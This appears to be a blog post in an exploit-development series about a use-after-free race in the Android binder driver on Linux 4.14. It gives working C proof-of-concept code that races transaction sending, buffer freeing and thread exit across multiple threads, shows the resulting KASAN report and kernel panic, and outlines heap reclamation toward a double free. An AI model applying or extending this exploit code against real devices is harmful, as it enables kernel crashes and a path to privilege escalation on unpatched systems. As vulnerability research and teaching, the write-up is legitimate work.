
I have been pretty busy, but I'm back. In the last part we successfully built a POC for triggering a KASAN report (in other words, a *UAF*). However, unluckily, it did not occur naturally, we forced it by adding a sleep to the kernel.

This time, we will work on lengthening the race window, and depending on how long it'll take us, we'll take the exploit a step further. It is trivial, between these two race paths, which of them we can lengthen in order to up our chances of winning the race. 

If we look at `binder_release_work()`:
```c
static void binder_release_work(struct binder_proc *proc,
				struct list_head *list)
{
	struct binder_work *w;

	while (1) {
		w = binder_dequeue_work_head(proc, list);
		if (!w)
			return;

		switch (w->type) {
			...
		}
	}
}
```

Note that `list`, in our execution path, is `thread->todo`. Thus, one can simply assume that if we add work to `thread->todo`, we'll for sure free our node before we dequeue etc. However, and this is very important, the race is actually even tighter. As we said in the previous post, we race against `binder_free_ref()`, which calls `binder_dec_node_nilocked()` on our node, which:
```c
static bool binder_dec_node_nilocked(struct binder_node *node,
				     int strong, int internal)
{
	struct binder_proc *proc = node->proc;

	[...]

	} else {
		if (hlist_empty(&node->refs) && !node->local_strong_refs &&
		    !node->local_weak_refs && !node->tmp_refs) {
			if (proc) {
				// --> Dequeues the node from the thread->todo!
				binder_dequeue_work_ilocked(&node->work); 
				rb_erase(&node->rb_node, &proc->nodes);
				binder_debug(BINDER_DEBUG_INTERNAL_REFS,
					     "refless node %d deleted\n",
					     node->debug_id);
			}
			[...]
			return true;
		}
	}
	return false;
}
```

That's actually not good for us. That means that our race is actually a (~)single-instruction race, which *CANNOT* be widened! Our race is simply from the moment `w` is dequeued, until `w->type` is read, and we HAVE to free the node between these times. 

Our only choice therefore, is to up our chances by multiplying the number of tries we do, as at this point it is purely statistical. To do so, we may simply send a few binder objects, and thus multiply the success rate of each iteration. 

Also, seeing as this is a tight race, we might also try to do something new, which is kind of make the context manager simply signal the client process when hes ready (and is initialized), and then the client process can spawn threads and spam it with transactions while the context manager simply frees every buffer it gets. That way we hugely raise concurrency.

To implement, let's first implement a simple flow for our context manager to simply read transaction and free the buffers:
```c
void __read_buffers_and_free(int fd) {
  /* The client sends its data, and we need to read the
   * buffer pointer in order to pass it in BC_FREE_BUFFER
   * for the race.
   */
  uint8_t read_buf[256] = {
      0,
  };
  struct binder_write_read bwr = {.read_size = sizeof(read_buf),
                                  .read_buffer = (uintptr_t)read_buf};
  ioctl(fd, BINDER_WRITE_READ, &bwr);

  /* Parse each command, and free 
   * every buffer passed.
   */
  uint8_t *cur = read_buf;
  uint8_t *end = read_buf + bwr.read_consumed;
  while (cur < end) {
    uint32_t cmd = *(uint32_t *)cur;
    cur += sizeof(uint32_t);
    if (cmd == BR_TRANSACTION) {
      struct binder_transaction_data *td =
          (struct binder_transaction_data *)cur;
      __free_buffer(fd, td->data.ptr.buffer);
    }

    cur += _IOC_SIZE(cmd);
  }
}
```

And:
```c
void _ctx_manager_race(void) {
  __pin_to_cpu(0);

  printf(INFO_PRINT "Initializing ctx mgr fd...\n");
  int fd = __binder_setup();
  __become_ctx_manager(fd);
  __enter_looper(fd);
  printf(INFO_PRINT "Became context manager, signaling client...\n");
  printf(INFO_PRINT "Server will now free every buffer it gets, good luck to us...\n");

  /* Signal client to initialize itself and sync */
  pipe_signal();

  for (;;) {
    __read_buffers_and_free(fd);
  }
}
```

Now, in the client, we first of all want to be able to split it to a few different threads, for efficiency, and secondly, we want to send a few binder objects every time. Let's start with sending a few objects every time:
```c
void __send_multi_object_transaction(int fd, int target, uint64_t binder_base) {
  struct flat_binder_object objs[N_BINDER_OBJECTS];
  uint64_t offsets[N_BINDER_OBJECTS];

  for (int i = 0; i < N_BINDER_OBJECTS; i++) {
    objs[i] = (struct flat_binder_object){
        .hdr.type = BINDER_TYPE_BINDER,
        .flags = 0x7f | (1 << 8),
        .binder = binder_base + i,
        .cookie = 0,
    };
    offsets[i] = i * sizeof(struct flat_binder_object);
  }

  struct transaction_data data = {
      .cmd = BC_TRANSACTION,
      .tr.target.handle = target,
      .tr.code = 1,
      .tr.flags = TF_ONE_WAY,
      .tr.data_size = sizeof(objs),
      .tr.offsets_size = sizeof(offsets),
      .tr.data.ptr.buffer = (uintptr_t)objs,
      .tr.data.ptr.offsets = (uintptr_t)offsets,
  };

  struct binder_write_read bwr = {
      .write_size = sizeof(data),
      .write_buffer = (uintptr_t)&data,
  };

  ioctl(fd, BINDER_WRITE_READ, &bwr);
}
```

As you can notice, we can leave the `.binder` field a fake buffer (as its not used), and we just need to make sure its unique for each object (between ALL objects, even all threads). 

Now, we simply create a function for the client race thread:
```c
void *__client_thread_fn(void *arg) {
  uint64_t binder_base = (uint64_t)(uintptr_t)arg;
  for (;;) {
    int n_fd = dup(g_client_fd);
    __send_multi_object_transaction(n_fd, 0, binder_base);
    /* Race: close fd → binder_deferred_release → binder_release_work */
    ioctl(n_fd, BINDER_THREAD_EXIT, 0);
    close(n_fd);
  }
  return NULL;
}
```

Note that we still `dup` a global `fd`. `_client_race` now looks like this:
```c
void _client_race(void) {
  __pin_to_cpu(1);

  printf(INFO_PRINT "Initializing client fd...\n");
  g_client_fd = __binder_setup();
  pipe_wait();

  pthread_t threads[N_CLIENT_THREADS];
  for (int i = 0; i < N_CLIENT_THREADS; i++) {
    uint64_t base = 0xdeadbeef + 0x1000 * i;
    pthread_create(&threads[i], NULL, __client_thread_fn, (void *)(uintptr_t)base);
  }

  for (int i = 0; i < N_CLIENT_THREADS; i++) {
    pthread_join(threads[i], NULL);
  }
}
```

And...:
```bash
~ $ ./poc
[*] Initializing client fd...
[*] Initializing ctx mgr fd...
[*] Became context manager, signaling client...
[*] Server will now free every buffer it gets, good luck to us...
==================================================================
BUG: KASAN: use-after-free in binder_release_work+0x284/0x3b0
Read of size 4 at addr ffffffc0d8dba318 by task poc/643

CPU: 0 PID: 643 Comm: poc Not tainted 4.14.172+ #6
Hardware name: linux,dummy-virt (DT)
Call trace:
[<        (ptrval)>] dump_backtrace+0x0/0x6f8
[<        (ptrval)>] show_stack+0x1c/0x24
[<        (ptrval)>] dump_stack+0xb0/0xf0
[<        (ptrval)>] print_address_description+0x60/0x24c
[<        (ptrval)>] kasan_report+0x14c/0x2f0
[<        (ptrval)>] __asan_report_load4_noabort+0x1c/0x24
[<        (ptrval)>] binder_release_work+0x284/0x3b0
[<        (ptrval)>] binder_thread_release+0x310/0x5a4
[<        (ptrval)>] binder_ioctl+0x964/0x45b4
[<        (ptrval)>] do_vfs_ioctl+0xc5c/0x13e0
[<        (ptrval)>] SyS_ioctl+0xa4/0xc0
Exception stack(0xffffffc0d8e9fec0 to 0xffffffc0d8ea0000)
fec0: 0000000000000006 0000000040046208 0000000000000000 000000000000017f
fee0: 0000007d7beb3520 552f05d5ce3cbaf6 0000000000000000 000000000049e608
ff00: 000000000000001d 0000000000000000 0000000000000033 00000000003d0f00
ff20: 0000000000000000 000000001bb10dc0 0000000000000001 0000000000000000
ff40: 0000000000000000 0000000000000000 0000000000000001 0000000000000000
ff60: 0000007d7beb393c 0000000000000000 0000007fd5f7c3bf 0000007fd5f7c3c8
ff80: 00000000004a0000 0000007fd5f7c3c0 0000000000000bc0 0000007d7beb3520
ffa0: 000000001bb10740 0000007d7beb2c50 0000000000400c8c 0000007d7beb2c50
ffc0: 000000000041de50 0000000000001000 0000000000000006 000000000000001d
ffe0: 0000000000000000 0000000000000000 0000000000000000 0000000000000000
[<        (ptrval)>] el0_svc_naked+0x34/0x38

Allocated by task 643:
 kasan_kmalloc+0xdc/0x184
 binder_new_node+0x70/0x810
 binder_transaction+0x2c7c/0x5000
 binder_thread_write+0x6f4/0x3540
 binder_ioctl+0xe04/0x45b4
 do_vfs_ioctl+0xc5c/0x13e0
 SyS_ioctl+0xa4/0xc0
 el0_svc_naked+0x34/0x38

Freed by task 640:
 kasan_slab_free+0xa4/0x198
 kfree+0x64/0x1e8
 binder_update_ref_for_handle+0x2e4/0x724
 binder_transaction_buffer_release+0x3c0/0x6c4
 binder_thread_write+0xf1c/0x3540
 binder_ioctl+0xe04/0x45b4
 do_vfs_ioctl+0xc5c/0x13e0
 SyS_ioctl+0xa4/0xc0
 el0_svc_naked+0x34/0x38

The buggy address belongs to the object at ffffffc0d8dba300
 which belongs to the cache kmalloc-128 of size 128
The buggy address is located 24 bytes inside of
 128-byte region [ffffffc0d8dba300, ffffffc0d8dba380)
The buggy address belongs to the page:
page:ffffffbf03636e80 count:1 mapcount:0 mapping:          (null) index:0x0
flags: 0x4000000000000200(slab)
raw: 4000000000000200 0000000000000000 0000000000000000 0000000100100010
raw: dead000000000100 dead000000000200 ffffffc0dac01c00 0000000000000000
page dumped because: kasan: bad access detected

Memory state around the buggy address:
 ffffffc0d8dba200: fb fb fb fb fb fb fb fb fb fb fb fb fb fb fb fb
 ffffffc0d8dba280: fc fc fc fc fc fc fc fc fc fc fc fc fc fc fc fc
>ffffffc0d8dba300: fb fb fb fb fb fb fb fb fb fb fb fb fb fb fb fb
                            ^
 ffffffc0d8dba380: fc fc fc fc fc fc fc fc fc fc fc fc fc fc fc fc
 ffffffc0d8dba400: fb fb fb fb fb fb fb fb fb fb fb fb fb fb fb fb
==================================================================
Disabling lock debugging due to kernel taint
binder: unexpected work type, 4, not freed
binder: unexpected work type, 4, not freed
binder: unexpected work type, 4, not freed
Kernel panic - not syncing: panic_on_warn set ...

CPU: 0 PID: 643 Comm: poc Tainted: G    B           4.14.172+ #6
Hardware name: linux,dummy-virt (DT)
Call trace:
[<        (ptrval)>] dump_backtrace+0x0/0x6f8
[<        (ptrval)>] show_stack+0x1c/0x24
[<        (ptrval)>] dump_stack+0xb0/0xf0
[<        (ptrval)>] panic+0x230/0x3ac
[<        (ptrval)>] kasan_end_report+0x50/0x6c
[<        (ptrval)>] kasan_report+0x1e8/0x2f0
[<        (ptrval)>] __asan_report_load4_noabort+0x1c/0x24
[<        (ptrval)>] binder_release_work+0x284/0x3b0
[<        (ptrval)>] binder_thread_release+0x310/0x5a4
[<        (ptrval)>] binder_ioctl+0x964/0x45b4
[<        (ptrval)>] do_vfs_ioctl+0xc5c/0x13e0
[<        (ptrval)>] SyS_ioctl+0xa4/0xc0
Exception stack(0xffffffc0d8e9fec0 to 0xffffffc0d8ea0000)
fec0: 0000000000000006 0000000040046208 0000000000000000 000000000000017f
fee0: 0000007d7beb3520 552f05d5ce3cbaf6 0000000000000000 000000000049e608
ff00: 000000000000001d 0000000000000000 0000000000000033 00000000003d0f00
ff20: 0000000000000000 000000001bb10dc0 0000000000000001 0000000000000000
ff40: 0000000000000000 0000000000000000 0000000000000001 0000000000000000
ff60: 0000007d7beb393c 0000000000000000 0000007fd5f7c3bf 0000007fd5f7c3c8
ff80: 00000000004a0000 0000007fd5f7c3c0 0000000000000bc0 0000007d7beb3520
ffa0: 000000001bb10740 0000007d7beb2c50 0000000000400c8c 0000007d7beb2c50
ffc0: 000000000041de50 0000000000001000 0000000000000006 000000000000001d
ffe0: 0000000000000000 0000000000000000 0000000000000000 0000000000000000
[<        (ptrval)>] el0_svc_naked+0x34/0x38
```

To be honest, I did not expect it to work this fast, but I am quite excited because of it. We now have a deterministic manner in which we can exploit.... ~ silly me forgot I had an `ssleep(1)` call in `binder_release_work()`... I then compiled the kernel again without it, and it took about half a minute to a minute to trigger, so that explains why it happened *too* fast before ~.

Anyways, now that we have it, we need to understand how to exploit it. Let's look at the function again:
```c
static void binder_release_work(struct binder_proc *proc,
                                struct list_head *list) {
  struct binder_work *w;

  while (1) {
    w = binder_dequeue_work_head(proc, list);

    if (!w)
      return;

    switch (w->type) {
    case BINDER_WORK_TRANSACTION: {
      struct binder_transaction *t;

      t = container_of(w, struct binder_transaction, work);

      binder_cleanup_transaction(t, "process died.", BR_DEAD_REPLY);
    } break;
    case BINDER_WORK_RETURN_ERROR: {
      struct binder_error *e = container_of(w, struct binder_error, work);

      binder_debug(BINDER_DEBUG_DEAD_TRANSACTION,
                   "undelivered TRANSACTION_ERROR: %u\n", e->cmd);
    } break;
    case BINDER_WORK_TRANSACTION_COMPLETE: {
      binder_debug(BINDER_DEBUG_DEAD_TRANSACTION,
                   "undelivered TRANSACTION_COMPLETE\n");
      kfree(w);
      binder_stats_deleted(BINDER_STAT_TRANSACTION_COMPLETE);
    } break;
    case BINDER_WORK_DEAD_BINDER_AND_CLEAR:
    case BINDER_WORK_CLEAR_DEATH_NOTIFICATION: {
      struct binder_ref_death *death;

      death = container_of(w, struct binder_ref_death, work);
      binder_debug(BINDER_DEBUG_DEAD_TRANSACTION,
                   "undelivered death notification, %016llx\n",
                   (u64)death->cookie);
      kfree(death);
      binder_stats_deleted(BINDER_STAT_DEATH);
    } break;
    default:
      pr_err("unexpected work type, %d, not freed\n", w->type);
      break;
    }
  }
}
```

In our case, we have `BINDER_WORK_NODE`, which is unfortunately not handled and gets us at `unexpected work type...`. To get a double free, we must try to reclaim it as quick as possible with another `kmalloc`'d object, and corrupt its `w->type`. While it is possible, it is in an even narrower window.